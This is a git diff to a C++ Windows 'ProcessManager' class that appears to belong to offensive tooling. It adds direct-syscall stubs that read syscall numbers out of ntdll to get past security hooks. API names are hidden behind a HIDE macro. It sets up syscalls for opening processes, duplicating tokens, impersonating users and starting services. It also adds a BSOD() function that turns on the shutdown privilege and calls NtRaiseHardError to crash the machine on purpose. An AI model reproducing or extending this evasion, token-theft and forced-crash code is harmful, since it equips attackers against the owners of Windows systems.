@@ -114,6 +114,19 @@ ProcessManager::ProcessManager() {
     OutputDebugStringA("loaded process manager");
 }
 
+unsigned int ProcessManager::GetSSN(HMODULE lib, std::string functionName) {
+    FARPROC address = GetFunctionAddressInternal(NTDLL, functionName);
+    if ( !address )
+        return -1;
+
+    BYTE* functionBytes = ( BYTE* ) address;
+
+    for ( int offset = 0; offset < 10; offset++ ) {
+        if ( functionBytes[offset] == 0xB8 ) // next byte is syscall number
+            return *( int* ) ( functionBytes + offset + 1 );
+    }
+}
+
 template <typename type>
 void ProcessManager::LoadNative(char* name, HMODULE from) {
     type loaded = GetFunctionAddress<type>(from, name);
@@ -138,6 +151,17 @@ void ProcessManager::SetThisContext(SecurityContext newContext) {
         this->m_Context = newContext;
 }
 
+void ProcessManager::BSOD() {
+    BOOLEAN state = FALSE;
+    ULONG   resp;
+
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("RtlAdjustPrivilege"));
+    SysRtlAdjustPrivilege(19, TRUE, FALSE, &state);
+
+    GetAndInsertSSN(NTDLL, (char*)HIDE("NtRaiseHardError"));
+    SysNtRaiseHardError(0xEAC9012, 0, 0, NULL, 6, &resp);
+}
+
 void ProcessManager::LoadAllNatives() {
     if ( this->m_NativesLoaded )
         return;
@@ -153,6 +177,8 @@ void ProcessManager::LoadAllNatives() {
     LoadNative<::_Process32NextW>((char*)HIDE("Process32NextW"), Kernel32DLL);
     LoadNative<::_Process32FirstW>((char*)HIDE("Process32FirstW"), Kernel32DLL);
     LoadNative<::_LoadLibrary>((char*)HIDE("LoadLibraryA"), Kernel32DLL);
+    LoadNative<::_RtlAdjustPrivilege>((char*)HIDE("RtlAdjustPrivilege"), NTDLL);
+
     this->m_NativesLoaded = TRUE;
 }
 
@@ -179,6 +205,7 @@ DWORD ProcessManager::PIDFromName(const char* name) {
 
     // process the first file in the snapshot, put information in processEntry
     if ( !GetNative<_Process32FirstW>((char*)HIDE("Process32FirstW")).call( processSnapshot, &processEntry ) ) {
+        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
         SysNtClose(processSnapshot);
         return -1;
     }
@@ -196,9 +223,18 @@ DWORD ProcessManager::PIDFromName(const char* name) {
         }
     } while ( GetNative<_Process32NextW>((char*)HIDE("Process32NextW")).call( processSnapshot, &processEntry ) ); // iterate if the next process in the snapshot is valid
 
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
     SysNtClose(processSnapshot);
 
     return processID;
+}
+
+void ProcessManager::GetAndInsertSSN(HMODULE lib, std::string functionName) {
+    unsigned int syscall = GetSSN(lib, functionName);
+    if ( syscall == -1 )
+        return;
+
+    InsertSyscall(syscall);
 }
 
 HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
@@ -210,6 +246,7 @@ HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
 
     InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
 
+    GetAndInsertSSN(NTDLL, (char*)HIDE("NtOpenProcess"));
     NTSTATUS openStatus = SysNtOpenProcess(
         &process,
         MAXIMUM_ALLOWED,
@@ -222,15 +259,18 @@ HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
     }
 
     HANDLE   processToken = NULL;
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenProcessTokenEx"));
     NTSTATUS openProcTokenStatus = SysNtOpenProcessTokenEx(process, TOKEN_DUPLICATE, 0, &processToken);
 
     if ( openProcTokenStatus != STATUS_SUCCESS ) {
+        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
         SysNtClose(process);
         return NULL;
     }
 
     InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
     HANDLE   duplicatedToken = NULL;
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtDuplicateToken"));
     NTSTATUS tokenDuplicated = SysNtDuplicateToken(
         processToken,
         MAXIMUM_ALLOWED,
@@ -241,11 +281,13 @@ HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
     );
 
     if ( tokenDuplicated != STATUS_SUCCESS ) {
+        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
         SysNtClose(processToken);
         SysNtClose(process);
         return NULL;
     }
 
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
     SysNtClose(process);
     SysNtClose(processToken);
 
@@ -284,6 +326,7 @@ DWORD ProcessManager::StartWindowsService(std::string serviceName) {
 
     SC_HANDLE service = GetNative<_OpenServiceA>((char*)HIDE("OpenServiceA")).call( scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE );
     if ( service == NULL ) {
+        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
         SysNtClose(scManager);
         return -1;
     }
@@ -301,6 +344,7 @@ DWORD ProcessManager::StartWindowsService(std::string serviceName) {
             sizeof(SERVICE_STATUS_PROCESS),
             &statusBytesNeeded
         ) ) {
+            GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
             SysNtClose(scManager);
             SysNtClose(service);
             return -1;
@@ -325,6 +369,7 @@ DWORD ProcessManager::StartWindowsService(std::string serviceName) {
         if ( status.dwCurrentState == SERVICE_STOPPED ) {
             BOOL serviceStarted = GetNative<_StartService>((char*)HIDE("StartServiceW")).call( service, 0, NULL );
             if ( !serviceStarted ) {
+                GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
                 SysNtClose(service);
                 SysNtClose(scManager);
                 return -1;
@@ -333,6 +378,7 @@ DWORD ProcessManager::StartWindowsService(std::string serviceName) {
     } while ( status.dwCurrentState != SERVICE_RUNNING );
 
     // service is now started
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
     SysNtClose(service);
     SysNtClose(scManager);
 
@@ -341,6 +387,7 @@ DWORD ProcessManager::StartWindowsService(std::string serviceName) {
 
 HANDLE ProcessManager::ImpersonateWithToken(HANDLE token) {
     if ( !GetNative<_ImpersonateLoggedOnUser>((char*)HIDE("ImpersonateLoggedOnUser")).call( token ) ) {
+        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
         SysNtClose(token);
         return NULL;
     }
